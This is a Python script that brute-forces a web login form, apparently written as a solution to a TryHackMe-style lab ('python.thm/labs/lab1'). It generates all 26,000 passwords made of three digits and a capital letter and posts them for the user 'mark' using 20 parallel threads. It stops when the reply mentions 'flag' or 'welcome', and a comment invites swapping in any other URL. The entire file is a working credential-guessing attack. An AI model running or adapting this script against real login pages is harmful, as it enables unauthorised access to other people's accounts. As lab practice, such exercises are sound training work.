import requests
import string
from concurrent.futures import ThreadPoolExecutor

url = "http://python.thm/labs/lab1/index.php"  # Replace with your actual URL
username = "mark"

# Build the full password list: 000A to 999Z
passwords = [f"{str(i).zfill(3)}{ch}" for i in range(1000) for ch in string.ascii_uppercase]

def try_login(password):
    data = {"username": username, "password": password}
    response = requests.post(url, data=data)
    
    if "flag" in response.text.lower() or "welcome" in response.text.lower():
        print(f"[+] Found password: {password}")
        print(response.text)
        return True
    return False

def main():
    with ThreadPoolExecutor(max_workers=20) as executor:
        results = executor.map(try_login, passwords)
        for result in results:
            if result:
                break  # Stop further attempts

if __name__ == "__main__":
    main()
